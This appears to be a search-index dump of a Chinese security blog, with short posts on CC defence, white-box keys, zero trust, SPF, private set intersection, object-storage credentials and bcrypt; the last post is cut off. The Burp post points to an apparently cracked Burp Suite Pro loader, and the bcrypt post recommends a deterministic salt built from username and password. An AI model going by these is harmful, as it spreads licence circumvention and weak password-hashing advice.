[{"title":"CC防御/接口防刷","url":"/2021/12/07/cc/","content":"<h3 id=\"CC攻击的传统防护\"><a href=\"#CC攻击的传统防护\" class=\"headerlink\" title=\"CC攻击的传统防护\"></a>CC攻击的传统防护</h3><ul>\n<li>每个Web访问者在规定时间内允许访问的次数。</li>\n<li>根据IP、Cookie或者Referer字段区分Web访问者。</li>\n<li>当访问超过限制时，对其访问进行阻断或者发送验证码验证。<a id=\"more\"></a></li>\n</ul>\n<p>以上针对非APP请求，采用<code>限速</code>、<code>JS验证</code>、<code>验证码人机挑战</code></p>\n<h3 id=\"为什么可以防护CC\"><a href=\"#为什么可以防护CC\" class=\"headerlink\" title=\"为什么可以防护CC\"></a>为什么可以防护CC</h3><p>攻击者：一般CC攻击不会调用浏览器，而是自己写程序/脚本实现。遇到WAF返回的JS或验证码就会失败、无法执行。来判断是机器人还是正常用户<br><img src=\"/images/CC%E6%94%BB%E5%87%BB.png\" alt=\"WAF拦截刷单\"></p>\n<p>如原本1个GET请求官网，开启5s盾、JS验证模式，浏览器解析后跳转到图形验证码，即1个GET变成了2个GET+1个POST（浏览器自动实现），而脚本请求得到的Response却是<strong>403</strong><br><img src=\"/images/%E5%BC%80%E5%90%AF%E9%AA%8C%E8%AF%81%E7%A0%81.PNG\" alt=\"CloudFlare开启验证码后\"></p>\n<h3 id=\"针对APP请求的CC防护\"><a href=\"#针对APP请求的CC防护\" class=\"headerlink\" title=\"针对APP请求的CC防护\"></a>针对APP请求的CC防护</h3><p>客户端APP（非H5应用），它不是浏览器是无法响应一些交互条件（框架里代码中写的函数或JSON调用，类似脚本），遭到CC攻击后难以通过”挑战-响应“的传统CC防御来处理（客户端不能执行JS）</p>\n<p>防护建议：</p>\n<ul>\n<li>设备指纹模型（指纹一致性、操作系统标识、秒拨IP识别、恶意行为识别）</li>\n<li>行为分析模型（源IP+设备封禁、回源节点识别、多维限速、代理识别）<br>即<code>OS指纹</code>、<code>程序指纹</code>、<code>设备指纹</code></li>\n</ul>\n","categories":["CC攻击"],"tags":["爬虫","刷接口"]},{"title":"白盒密钥","url":"/2021/11/19/baihe/","content":"<p>-<a href=\"https://www.codenong.com/cs106178660/\" title=\"码农家园\">Android应用的白盒加密</a><br>-<a href=\"https://www.twblogs.net/a/5ec38160389f7e906095fe7e\" title=\"台部落\">Android應用的白盒加密</a></p>\n<h3 id=\"目的\"><a href=\"#目的\" class=\"headerlink\" title=\"目的\"></a>目的</h3><p>业务执行AES对称加密算法，必然要考虑如何安全存储加密密钥的问题，白盒密钥实现在整个加密过程中不再明文出现<code>(非)对称密钥</code></p>\n<h3 id=\"算法支持\"><a href=\"#算法支持\" class=\"headerlink\" title=\"算法支持\"></a>算法支持</h3><p>支持对称与非对称算法如SM4、AES、DES、3DES、RSA（看厂商支持情况），AES算法最广<a id=\"more\"></a></p>\n<h3 id=\"实现方式\"><a href=\"#实现方式\" class=\"headerlink\" title=\"实现方式\"></a>实现方式</h3><p>白盒的实现方式主要有三种：</p>\n<ul>\n<li>查找表技术</li>\n<li>插入扰乱项</li>\n<li>多变量密码</li>\n</ul>\n<p>即使有了白盒的保护，密钥也并不绝对安全，白盒也面临着多种多样的攻击（BGE攻击、DFA攻击）。</p>\n<h3 id=\"应用场景\"><a href=\"#应用场景\" class=\"headerlink\" title=\"应用场景\"></a>应用场景</h3><ul>\n<li><p><font color=\"blue\"><strong>移动应用客户端</strong></font>要保存敏感数据的场景<br>涉及到账号、密码类敏感信息，要避免移动端保存，验证过程需要以安全信道发送到服务端来验证。对于一定要移动端保存的一些涉密信息，建议采用对称白盒加密的方法，集成安全SDK，白盒加密在整个运行环境中不出现加解密密钥key</p>\n</li>\n<li><p>保护APIKey的场景<br>不同服务系统之间调用API，针对AK/SK的保护可以使用白盒密钥解决<br>目标：调用方存储APIKey密文，使用时在内存中解密成APIKey明文<br>（可以理解APIKey用AES加密，但AES密钥又没有泄露，避免明文SK及加密时的明文key都暴漏）<br><img src=\"/images/API%E5%AF%86%E9%92%A5%E4%BF%9D%E6%8A%A4%E6%B5%81%E7%A8%8B.png\" alt=\"白盒密钥应用在APIKey的场景\"></p>\n</li>\n</ul>\n","categories":["白盒密钥"],"tags":["白盒密钥"]},{"title":"SDN网络","url":"/2021/08/27/sdn/","content":"<p>-<a href=\"https://zhuanlan.zhihu.com/p/52110156\">SDN名词解释</a></p>\n<h3 id=\"什么是SDN\"><a href=\"#什么是SDN\" class=\"headerlink\" title=\"什么是SDN\"></a>什么是SDN</h3><p>SDN：网络设备（交换机、防火墙、路由器）可以集中式管理，可编程，控制和转发分离。</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>购买SDN交换机设备来管控现有的网络设备</p>\n","categories":["SDN"],"tags":["SDN"]},{"title":"威胁情报建设","url":"/2021/08/18/ioc/","content":"<p><img src=\"/images/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5.png\" alt=\"\"></p>\n<a id=\"more\"></a>\n","categories":["威胁情报"],"tags":["威胁情报"]},{"title":"微信PC端Burp抓包","url":"/2021/08/10/burp/","content":"<h3 id=\"最新Burp下载地址，Java版本必须10以上\"><a href=\"#最新Burp下载地址，Java版本必须10以上\" class=\"headerlink\" title=\"最新Burp下载地址，Java版本必须10以上\"></a>最新Burp下载地址，Java版本必须10以上</h3><p>-<a href=\"https://www.ddosi.org/b309/\" title=\"雨苁\">🔰雨苁ℒ🔰</a></p>\n<h3 id=\"Burp-2020-6开始支持HTTP-2\"><a href=\"#Burp-2020-6开始支持HTTP-2\" class=\"headerlink\" title=\"Burp_2020.6开始支持HTTP/2\"></a>Burp_2020.6开始支持HTTP/2</h3><h3 id=\"只需要三个文件Burp-start-vbs-burpsuite-pro-v2020-jar-BurpSuiteLoader-v2020-jar\"><a href=\"#只需要三个文件Burp-start-vbs-burpsuite-pro-v2020-jar-BurpSuiteLoader-v2020-jar\" class=\"headerlink\" title=\"只需要三个文件Burp_start.vbs,burpsuite_pro_v2020.jar,BurpSuiteLoader_v2020.jar\"></a>只需要三个文件<code>Burp_start.vbs</code>,<code>burpsuite_pro_v2020.jar</code>,<code>BurpSuiteLoader_v2020.jar</code></h3><h3 id=\"微信PC端抓包\"><a href=\"#微信PC端抓包\" class=\"headerlink\" title=\"微信PC端抓包\"></a>微信PC端抓包</h3><p>Burp+Proxifier结合，抓PC端所有应用的网络请求，如微信应用程序：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">WeChatBrowser</span><span class=\"selector-class\">.exe</span>;<span class=\"selector-tag\">wechatapp</span><span class=\"selector-class\">.exe</span>;<span class=\"selector-tag\">wechat</span><span class=\"selector-class\">.exe</span>;<span class=\"selector-tag\">Wechat_Browser</span><span class=\"selector-class\">.exe</span>;<span class=\"selector-tag\">wechatweb</span><span class=\"selector-class\">.exe</span>;<span class=\"selector-tag\">wechatapplauncher</span><span class=\"selector-class\">.exe</span></span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n","categories":["抓包工具"],"tags":["Burp","微信PC"]},{"title":"数据安全","url":"/2021/07/22/data/","content":"<ul>\n<li><a href=\"https://www.sec-un.org/%e6%95%b0%e6%8d%ae%e5%ae%89%e5%85%a8%e7%9a%84%e7%ac%ac%e4%b8%80%e9%81%93%e5%9d%8e/\">数据安全的第一道坎</a><h3 id=\"业务强耦合\"><a href=\"#业务强耦合\" class=\"headerlink\" title=\"业务强耦合\"></a>业务强耦合</h3></li>\n</ul>\n<p>数据安全离业务更近，绝大部分是跟业务强耦合的<br>网络安全离业务较远，面对的是运维</p>\n<a id=\"more\"></a>\n<p>网络安全的主体是底层的基础设施<br>数据安全的主体是基础设施上存储/使用/流转的数据</p>\n<p>静态数据——一定空间和时间持续存在的数据<br>动态数据——实时/准实时的数据流转</p>\n<p>数据资产识别系统<br>范围：数据中心——&gt;存储在数据库、大数据平台——&gt;有特征、结构化的静态识别</p>\n","categories":["数据平台"],"tags":["大数据治理"]},{"title":"SPF防范假冒邮件","url":"/2021/07/14/spf/","content":"<p>如果你购买的域名，没有配置SPF值，则黑客可以冒充你的域名后缀发送邮件。</p>\n<h3 id=\"添加TXT记录\"><a href=\"#添加TXT记录\" class=\"headerlink\" title=\"添加TXT记录\"></a>添加TXT记录</h3><figure class=\"highlight angelscript\"><table><tr><td class=\"code\"><pre><span class=\"line\">v=spf1 include:spf.mail.qq.com ip4:<span class=\"number\">1.1</span><span class=\"number\">.1</span><span class=\"number\">.1</span> -all</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"检测是否有SPF漏洞\"><a href=\"#检测是否有SPF漏洞\" class=\"headerlink\" title=\"检测是否有SPF漏洞\"></a>检测是否有SPF漏洞</h3><p>Windows下，命令行下输入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nslookup -<span class=\"built_in\">type</span>=txt 域名</span><br></pre></td></tr></table></figure>\n\n<p>Unix下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">dig 域名 txt +short</span><br></pre></td></tr></table></figure>\n","categories":["SPF"],"tags":["SPF","伪造邮箱"]},{"title":"风控VS黑灰产","url":"/2021/06/30/fengkong/","content":"<h3 id=\"秒拨IP\"><a href=\"#秒拨IP\" class=\"headerlink\" title=\"秒拨IP\"></a>秒拨IP</h3><p>利用家庭宽带线路分配得到动态IP的特性，自动断线重连切换IP <a id=\"more\"></a></p>\n<ul>\n<li>秒拨IP难以识别<br>因为秒拨IP和正常用户IP取自同一个IP池，秒拨IP的使用周期（通常在秒级或分钟级）结束后，大概率会流转到正常用户手中，所以区分秒拨IP和正常用户IP难度很大</li>\n<li>IP池巨大<br>假设某秒波机上的宽带资源属于广东地区电信运营商，那么该秒拨机可拨到全国区域电信IP池中的IP</li>\n</ul>\n<h3 id=\"传统方案\"><a href=\"#传统方案\" class=\"headerlink\" title=\"传统方案\"></a>传统方案</h3><p>威胁情报、网络层封IP</p>\n<h3 id=\"针对方案\"><a href=\"#针对方案\" class=\"headerlink\" title=\"针对方案\"></a>针对方案</h3><p>秒拨攻击动作发生在XDSL环节，在这一层未到核心路由之前进行封堵/风险分析</p>\n","categories":["风控"],"tags":["业务安全"]},{"title":"零信任架构","url":"/2021/06/10/zero/","content":"<h3 id=\"零信任概念\"><a href=\"#零信任概念\" class=\"headerlink\" title=\"零信任概念\"></a>零信任概念</h3><p>零信任：永不信任，始终验证。技术本质是构建以身份为基石的业务动态可信访问控制机制</p>\n<p>① 应该假设网络始终存在<strong><em>外部威胁和内部威胁</em></strong>，仅仅通过网络位置来评估信任是不够的<br>② 默认情况下不应该信任网络内部或外部的任何人/设备/系统，而是基于<strong><em>认证和授权</em></strong> 重构业务访问控制的信任基础<br>③ 每个设备、用户对业务的访问都应该被<strong><em>认证、授权和加密</em></strong><br>④ 访问控制策略和信任应该是<strong><em>动态</em></strong> 的，基于设备、用户和环境的多源环境数据计算出来</p>\n<a id=\"more\"></a>\n\n\n\n<p><img src=\"/images/%E9%9B%B6%E4%BF%A1%E4%BB%BB%E6%9E%B6%E6%9E%84.png\" alt=\"\" title=\"零信任架构模型\"><br><img src=\"/images/%E7%BE%8E%E5%9B%BD%E5%9B%BD%E9%98%B2%E9%83%A8%E9%9B%B6%E4%BF%A1%E4%BB%BB%E5%8F%82%E8%80%83%E6%9E%B6%E6%9E%84.png\" alt=\"\" title=\"美国国防部零信任参考架构\"><br>上图展示了用户侧访问控制、数据侧访问控制（PEP节点）。最左侧还将用户侧区分为设备访问和人员访问</p>\n<h3 id=\"零信任的优势\"><a href=\"#零信任的优势\" class=\"headerlink\" title=\"零信任的优势\"></a>零信任的优势</h3><p>东西向流量的威胁防护<br>打破网络边界</p>\n<h3 id=\"优缺点\"><a href=\"#优缺点\" class=\"headerlink\" title=\"优缺点\"></a>优缺点</h3><p>传统网络：<br>传统的基于边界的网络安全是先连接，后信任。<br>传统的网络安全架构默认内网是安全的，仅仅在网络边界部署了大量的设备</p>\n<p>零信任的关键在于控制对数据的访问权限，而与数据所在的位置无关，与访问发起者的位置无关。<br>零信任的做法是先信任，后连接，只有通过动态的认证和授权，才可能发起对数据资源的访问连接，这是和传统网络安全方法的主要区别。<br><img src=\"/images/%E9%9B%B6%E4%BF%A1%E4%BB%BB%E4%BC%98%E7%BC%BA%E7%82%B9.png\" alt=\"\" title=\"零信任优缺点\"></p>\n<h3 id=\"零信任分类\"><a href=\"#零信任分类\" class=\"headerlink\" title=\"零信任分类\"></a>零信任分类</h3><ul>\n<li><p>边缘零信任（远程移动办公/特权运维）<br>设备代理+网关模式（Web代理网关or网络隧道网关）</p>\n</li>\n<li><p>数据中心内部应用之间的零信任<br>接口/服务/进程之间<br>零信任的建设，不单单是零信任网关，还包括内网PKI体系建设，证书认证体系（脚本认证、机器认证、接口认证，进程认证等）</p>\n</li>\n</ul>\n","categories":["零信任"],"tags":["认证","鉴权"]},{"title":"隐私集合求交PSI","url":"/2021/04/13/psi/","content":"<h3 id=\"隐私集合求交PSI\"><a href=\"#隐私集合求交PSI\" class=\"headerlink\" title=\"隐私集合求交PSI\"></a>隐私集合求交PSI</h3><p>原理：双方各自都加密，不泄露明文数据，交换加密数据后，（执行同态加密运算）求两者的交集集合/个数，而不泄露非交集合给任何一方</p>\n<p>场景1：Chrome Password Checkup密码检查插件<a id=\"more\"></a><br>目的：我的数据在不在你的DB中？即交集</p>\n<p><img src=\"/images/PSI_passwordcheckup.PNG\" alt=\"\" title=\"密码安全检查插件技术\"></p>\n<ul>\n<li><a href=\"https://duo.com/labs/tech-notes/protecting-accounts-from-credential-stuffing\" title=\"PROTECTING ACCOUNTS FROM CREDENTIAL STUFFING\">Google Password Checkup解读</a></li>\n</ul>\n<p>实现效果：</p>\n<figure class=\"highlight angelscript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>、云端几十G的数据，没有全部发送给client，模糊匹配后只发送了几M的数据</span><br><span class=\"line\"><span class=\"number\">2</span>、DB不在client端，有更新的问题</span><br><span class=\"line\"><span class=\"number\">3</span>、云端不知道你的原始数据，同时也不会知道你的实际数据</span><br><span class=\"line\"><span class=\"number\">4</span>、浏览器本地找出了交集结果，同时也没发送pwd，云端不需要知道交集</span><br><span class=\"line\"><span class=\"number\">5</span>、中间使用了EDCH加密算法的一个变体，核心算法就是ck(sk(hash)) = sk(ck(hash))</span><br><span class=\"line\"><span class=\"number\">6</span>、上述流程，client端可开放给其他公司合作，并不会泄露云端DB原始的密码库，只需要双方保持算法一致</span><br></pre></td></tr></table></figure>\n<p>要求不高的话，可以不用key加密散列的密码，即不发送Ⅱ（client端不上传密码），云端直接返回几M的明文hash(username,pwd)。但次数多了，client端是可以拿到全量的DB库</p>\n<p>场景2：</p>\n<ul>\n<li><a href=\"https://engineering.fb.com/2020/07/10/open-source/private-matching/\" title=\"Private matching for compute: New solutions to the problem of enabling compute on private set intersections\">PSI新解决方案</a></li>\n</ul>\n<h3 id=\"联邦学习\"><a href=\"#联邦学习\" class=\"headerlink\" title=\"联邦学习\"></a>联邦学习</h3><ul>\n<li><a href=\"https://blog.csdn.net/JDDTechTalk/article/details/109738346?utm_medium=distribute.pc_feed_404.none-task-blog-2~default~OPENSEARCH~default-1.nonecase&dist_request_id=1331645.11073.16183852512799045&depth_1-utm_source=distribute.pc_feed_404.none-task-blog-2~default~OPENSEARCH~default-1.nonecas\">一文读懂联邦学习的前世今生（建议收藏）</a></li>\n<li><a href=\"https://blog.openmined.org/private-machine-learning-explained/\" title=\"private-machine-learning-explained\">隐私保护数据安全名词解释</a></li>\n</ul>\n<p>目的：公司有自己的机器学习模型，对大量数据进行训练，期望联合其他公司的数据来更新模型<br><img src=\"/images/%E8%81%94%E9%82%A6%E5%AD%A6%E4%B9%A0.png\" alt=\"\" title=\"联邦学习只传送训练后的模型数据\"></p>\n<p>横向联邦学习：两个数据集中，用户特征字段交集较多，用户ID重叠较少，想扩充自己的用户群体<br>纵向联邦学习：两个数据集中，用户ID交集较多，但用户特征字段重叠较少，想扩充当前用户群体的多元化属性</p>\n<p>A有特征数据，B有这些特征用户的<font color=Blue>标签</font>数据。比如信誉高低就是个label，AB联合建模就是纵向的</p>\n<p>联邦学习的安全问题：恶意的联邦成员，利用建模阶段所需的大量中间值，推算出对应的原始数据</p>\n<p>采用隐私保护技术<em>（见下文）</em>来提升联邦学习的安全性。</p>\n<h3 id=\"隐私保护技术\"><a href=\"#隐私保护技术\" class=\"headerlink\" title=\"隐私保护技术\"></a>隐私保护技术</h3><ul>\n<li><a href=\"https://www.secrss.com/articles/13856\" title=\"安全内参\">大数据隐私保护关键技术解析：数据脱敏、匿名化、差分隐私和同态加密</a></li>\n</ul>\n<p>主要思想是对训练模型过程的中间结果进⾏某种变换，以掩盖原始数据或改变其数据特性，从⽽使得恶意联邦成员的破解技术失效，同时还能保证诚实的联邦成员依然可以从数据中学习到经验。<br>相当于数据提供方将数据放入保险箱中进行传输，其他联邦成员无法打开箱子看到真实数据，但却可以在不解锁的情况下，对保险箱中的数据完成训练所需的操作；当训练完成后，数据提供方再开箱取出计算结果即可。<br>这种理想的功能需要我们使用特殊的技术进行实现，其中常⽤技术包括差分隐私、同态加密等。</p>\n<h4 id=\"K-匿名\"><a href=\"#K-匿名\" class=\"headerlink\" title=\"K-匿名\"></a>K-匿名</h4><p>你要想公开某些批量信息，要对多列数据进行抽象/模糊化、泛化处理，对某个属性字段的范围变大，形成K个等价类</p>\n<ul>\n<li><mark>假名化</mark> 将身份ID重命名，映射可逆的</li>\n<li><mark>去标识化</mark> 删除身份ID相关的信息</li>\n<li><mark>匿名化</mark> 攻击者无法“识别”具体一条记录</li>\n</ul>\n<p>以上三种方法对<strong>数据可用性</strong>依次降低，但<strong>隐私保密性</strong>越来越高</p>\n<h4 id=\"差分隐私算法\"><a href=\"#差分隐私算法\" class=\"headerlink\" title=\"差分隐私算法\"></a>差分隐私算法</h4><p>为了防止联邦学习的模型推导出原始的用户数据，可以使用差分隐私或加密计算<br>即原始数据集中加入了噪声，并不影响对数据集的统计分析。例如将年龄从50改为46或者51</p>\n<p>场景：</p>\n<ul>\n<li>对小量数据添加噪声，无法保证统计分析结果的准确性，故只能用于大量的数据，一般用在有共性统计的数据分析</li>\n<li>添加噪声后，分析结果的准确性下降，故对结果不能很严格</li>\n</ul>\n<h4 id=\"同态加密\"><a href=\"#同态加密\" class=\"headerlink\" title=\"同态加密\"></a>同态加密</h4><p>同态加密允许直接对加密数据执行某些类型的计算，而无需先对其解密，从而保留了原始数据的私密性。<br>个人敏感信息直接加密，然后在密文数据上直接统计与机器学习，计算过程中无需解密，对结果进行解密</p>\n<h4 id=\"零知识证明\"><a href=\"#零知识证明\" class=\"headerlink\" title=\"零知识证明\"></a>零知识证明</h4><h4 id=\"安全多方计算\"><a href=\"#安全多方计算\" class=\"headerlink\" title=\"安全多方计算\"></a>安全多方计算</h4><h3 id=\"Q-amp-A\"><a href=\"#Q-amp-A\" class=\"headerlink\" title=\"Q&amp;A\"></a>Q&amp;A</h3><hr>\n<p>Q：联邦学习和PSI有啥关系？<br>A：在利用联邦学习建立模型之前，不共享数据的前提下怎么知道双方的重叠数据？这就需要PSI，俗称ID对齐</p>\n<hr>\n<p>Q：联邦学习的目标，是拿到对方的数据？<br>A：不恰当，在本地数据建模训练后，把训练结果而非数据上传云端，再进行模型聚合，目标是提升模型预测的准确性<br>A：联邦学习的目标是预测/期望label标签那一列更加准确</p>\n<hr>\n<p>Q：啥是特征，啥是标签？<br>A：特征是某些固有属性，<font color=Blue>标签</font>是根据固有属性产生/推导出的认知，一个结论，并不一定是事物本身所具有的属性<br>A：所以<font color=Blue>标签</font>可能会变/实时更新</p>\n<hr>\n","categories":["PSI"],"tags":["K-匿名","同态加密"]},{"title":"对象存储","url":"/2021/03/26/s3/","content":"<h3 id=\"对象存储\"><a href=\"#对象存储\" class=\"headerlink\" title=\"对象存储\"></a>对象存储</h3><p>Bucket（桶）和Object（对象）</p>\n<p>Bucket是一个网络资源，相当于一个文件夹、硬盘。 桶名是独一无二的，全网唯一。不同的Region，可以有相同的桶名<a id=\"more\"></a></p>\n<p>Bucket可以看做Object的集合。 一个Object相当于一个文件。但Bucket中只有Object，没有文件夹这个概念。 基于Object，可以单独地做读写（上传与下载）、权限管控等操作。</p>\n<h3 id=\"AK-SK\"><a href=\"#AK-SK\" class=\"headerlink\" title=\"AK/SK\"></a>AK/SK</h3><p>Bucket作为一个网络资源，有三种权限配置：<strong>公共读写</strong>、<strong>公共读</strong>、<strong>私有</strong>。<br><strong>公共类</strong>，<font color=Blue>不需要AK/SK</font>，知道URL就能访问，建议限制源端IP<br><strong>私有类</strong>，需要携带AK/SK，OSS云端校验通过后，才能访问</p>\n<p>AccessKey和SecretKey不能泄露，不能给第三方，相当于你的账号凭证。<br>阿里云用AK（AccessKeyID/AccessKeySecret）表示密钥对</p>\n<figure class=\"highlight angelscript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>、不应该用主账号的AK/SK，应该创建子账号AK/SK并赋予最小存储桶权限</span><br><span class=\"line\"><span class=\"number\">2</span>、推荐不同的桶，创建不同的AK/SK</span><br><span class=\"line\"><span class=\"number\">3</span>、AK/SK不应该明文存储</span><br><span class=\"line\"><span class=\"number\">4</span>、AK/SK不应该放在客户端上，只应该在后端</span><br><span class=\"line\"><span class=\"number\">5</span>、客户端（Android、IOS、Web）要直接访问对象存储，需先向后端服务器请求加签的URL</span><br><span class=\"line\"><span class=\"number\">6</span>、临时的访问凭证（给第三方用），用主账号的AK/SK调用STS产生一个临时的AK/SK，发给第三方</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"STS\"><a href=\"#STS\" class=\"headerlink\" title=\"STS\"></a>STS</h3><p>STS是阿里云提供的API，你创建的桶，想给其他人来访问，直接给你的真实AK/SK是不安全的<br>建议在后端服务器自行实现调用STS生成临时的AK/SK，再发送给第三方/APP客户端</p>\n<p><img src=\"/images/STS.png\" alt=\"STS临时账号授权\"><br>当然了，第三方可能很懒，你给他一个临时AK/SK还需要他自己实现接口签名才能访问OSS。<br>这块工作你也可以帮他来做，叫<font color=Blue>预签名</font>。即上图的<code>第5步</code>由你的APP服务器来实现，生成临时的下载URL给第三方，对方不需要什么开发量，直接访问URL就行</p>\n<h3 id=\"Web前端直传OSS\"><a href=\"#Web前端直传OSS\" class=\"headerlink\" title=\"Web前端直传OSS\"></a>Web前端直传OSS</h3><p>一个GET，从应用服务器获取<code>AccessID</code>、<code>Policy</code>、<code>Signature</code>三个值<br>一个POST，将本地文件上传到OSS</p>\n<p><code>Policy</code>定义授权策略，过期时间等<br>为防止C端篡改Object名称、上传目录、callback等，应对这些字段在policy中写死进行signature签名，不可篡改。<br>即上传的file key必须由服务端指定。<br>签名方法<code>Signature = base64(hmac-sha1(base64(policy), AccessKeySecret))</code></p>\n<p>Tips：一次签名只能上传一个文件，通过在<code>policy</code>里面设置 content-length-range(文件大小限制)和 key(文件路径)，来控制用户的上传策略，如果严格一点还可以设置必须让用户上传的文件类型</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">content-length-range</span>=<span class=\"number\">524288</span> 字节</span><br><span class=\"line\"><span class=\"attr\">key</span>=/user/logo/<span class=\"number\">3</span>f7a68dbfa984a189f80612343064f32.png</span><br></pre></td></tr></table></figure>\n\n<p>-<a href=\"https://help.aliyun.com/document_detail/31927.html\">Web端上传数据至OSS实践</a></p>\n<h3 id=\"没钱的话，个人博客静态网页可以试试OSS对象存储托管\"><a href=\"#没钱的话，个人博客静态网页可以试试OSS对象存储托管\" class=\"headerlink\" title=\"没钱的话，个人博客静态网页可以试试OSS对象存储托管\"></a>没钱的话，个人博客静态网页可以试试OSS对象存储托管</h3>","categories":["对象存储"],"tags":["s3","oss"]},{"title":"术语","url":"/2021/03/17/suyu/","content":"<h3 id=\"maven\"><a href=\"#maven\" class=\"headerlink\" title=\"maven\"></a>maven</h3><p><img src=\"/images/maven.jpg\" alt=\"\" title=\"后端开发IDE阶段才会用到maven\"><br>Maven主要做了两件事：<br>统一开发规范与工具<br>统一管理jar/aar/so包<a id=\"more\"></a></p>\n<p>maven是一个JAVA项目管理工具，直接配置pom文件，maven会自动帮你下载和管理jar包。<br>maven项目的目录结构遵守以下规范</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">路径</th>\n<th align=\"center\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">src/main/java</td>\n<td align=\"center\">存放项目的.java文件，开发源代码</td>\n</tr>\n<tr>\n<td align=\"center\">src/main/resources</td>\n<td align=\"center\">存放项目配置文件，如spring, hibernate配置文件</td>\n</tr>\n<tr>\n<td align=\"center\">src/main/webapp</td>\n<td align=\"center\">存放web项目资源文件（web项目才有）</td>\n</tr>\n<tr>\n<td align=\"center\">pom.xml</td>\n<td align=\"center\">maven项目核心配置文件</td>\n</tr>\n</tbody></table>\n<p>就是如果是一个maven项目那么它的根目录下必定存在src文件夹和pom.xml。</p>\n<h3 id=\"Node-js\"><a href=\"#Node-js\" class=\"headerlink\" title=\"Node.js\"></a>Node.js</h3><p>前端项目，在服务器上解析运行js文件</p>\n<p><code>src</code>文件夹，存放前端工程师的源代码，如app.vue等源码，<code>dist</code>文件夹，存放编译好的前端文件</p>\n<p>npm install xxx包，从仓库下载的依赖资源包都放在了node_modules目录下面</p>\n<p>npm包是前端js资源仓库包，例xxx.min.js，xxx(hash).js</p>\n<p><strong>webpack编译打包项目</strong>，运行<code>npm run build</code>后，生成了一个dist文件夹，放在Nginx/tomcat服务器指定路径下</p>\n<p><img src=\"/images/npm_dist.png\" alt=\"\" title=\"前端IDE开发工具视图\"><br><img src=\"/images/npm_dist1.png\" alt=\"\" title=\"Nodejs服务器上视图\"></p>\n<h3 id=\"ansible\"><a href=\"#ansible\" class=\"headerlink\" title=\"ansible\"></a>ansible</h3><p>1、基于ssh运行<br>2、无需客户端</p>\n<p><code>Ansible</code> 拿来做服务器部署再合适不过。只需要<strong>准备好一份主机清单和要执行的命令步骤</strong>，就可以实现<strong>对一个清单的全部主机远程 批量执行命令</strong>。</p>\n<p>推荐免密公钥SSH登录远程主机清单</p>\n<h3 id=\"CI-CD流程\"><a href=\"#CI-CD流程\" class=\"headerlink\" title=\"CI/CD流程\"></a>CI/CD流程</h3><p>CI<code>持续集成</code>：源代码—&gt;编译后的包，即BUILD。最终产物推送到镜像仓库<br>CD<code>持续部署</code>：包—-&gt;生产环境上线</p>\n<p><strong><em>Dockerfile</em></strong> 用于构建一个镜像的文件（基于标准镜像改ba改ba）</p>\n<p>1.编写代码<br>2.自测+测试用例<br>3.编写Dockerfile<br>4.构建Docker镜像<br>5.推送Docker镜像到仓库<br>6.编写k8s YAML 文件<br>7.更新 YAML 文件中的Docker镜像TAG<br>8.利用kubectl工具部署应用</p>\n<p>-<a href=\"https://blog.ops-coffee.cn/s/gatfwneto_agsjhzdv5yzq\" title=\"运维咖啡吧\">中小团队基于Docker的devops实践</a></p>\n","categories":["名词解释"],"tags":["专业术语"]},{"title":"bcrypt最佳实践","url":"/2021/03/02/bcrypt/","content":"<p><a href=\"https://bcrypthashgenerator.tool-kit.dev/\">bcrypt在线生成工具</a></p>\n<h3 id=\"bcrypt组成\"><a href=\"#bcrypt组成\" class=\"headerlink\" title=\"bcrypt组成\"></a>bcrypt组成</h3><p><img src=\"/images/bcrypt.png\" alt=\"Bcrpt密文\"></p>\n<ul>\n<li><code>2a</code>:算法标识符</li>\n<li><code>10</code>:轮数，默认是10，即2^10=1024次迭代<a id=\"more\"></a></li>\n<li><code>YET3WUXkOBCwKxOzLha2MO</code>:原始salt值是<code>heyaff@123456789</code>16字节128bits，你看到的YET开头是经OpenBSD-Base64编码后22字符，故<strong>盐值可逆</strong></li>\n<li><code>VaGgw3duNuPMQqx1LUV4CoXxTHUJihO</code>：哈希后的密文是23字节184bit，经OpenBSD-Base64编码后，你看到的是31字符</li>\n</ul>\n<h3 id=\"bcrypt特征\"><a href=\"#bcrypt特征\" class=\"headerlink\" title=\"bcrypt特征\"></a>bcrypt特征</h3><p>默认情况下，salt随机生成，故同一个密码，bcrypt每次生成的hash都不一样</p>\n<ul>\n<li>慢散列hash算法，单向不可逆</li>\n<li>轮数固定，bcrypt时间也是固定的，默认是10，只需300~500ms</li>\n<li>轮数和salt都固定，同一个密码多次bcrypt的结果不会变</li>\n<li>轮数越大，时间指数级增加</li>\n<li>bcrypt比MD5慢的太多，有效防止彩虹表攻击</li>\n</ul>\n<h3 id=\"后端执行bcrypt的实践方案\"><a href=\"#后端执行bcrypt的实践方案\" class=\"headerlink\" title=\"后端执行bcrypt的实践方案\"></a>后端执行bcrypt的实践方案</h3><p><img src=\"/images/bcrypt_3.png\" alt=\"Bcrypt用在后端\"><br>i. 前端js对口令执行MD5后，再用后端公钥进行加密<br>ii. 后端用私钥解密，得到口令的MD5值，执行bcrypt≈SHA256加盐散列，保存到数据库中</p>\n<p>小技巧：<br>公钥加密前，必须对口令执行哈希散列，要不然后端内存中会有明文口令</p>\n<h3 id=\"前端执行bcrypt的最佳实践\"><a href=\"#前端执行bcrypt的最佳实践\" class=\"headerlink\" title=\"前端执行bcrypt的最佳实践\"></a>前端执行bcrypt的最佳实践</h3><p>不推荐后端服务器执行bcrypt，影响服务器性能和并发，故推荐前端慢速加盐散列，百毫秒级的延时，对用户的影响几乎忽略不计，来对抗暴力破解和撞库<br><img src=\"/images/bcrypt1.png\" alt=\"Bcrypt最佳实践\"><br>i. 前端js对用户的口令执行bcrypt，盐值固定为’用户名’+’口令’+’固定字符串’拼接而成，伪代码如下</p>\n<figure class=\"highlight 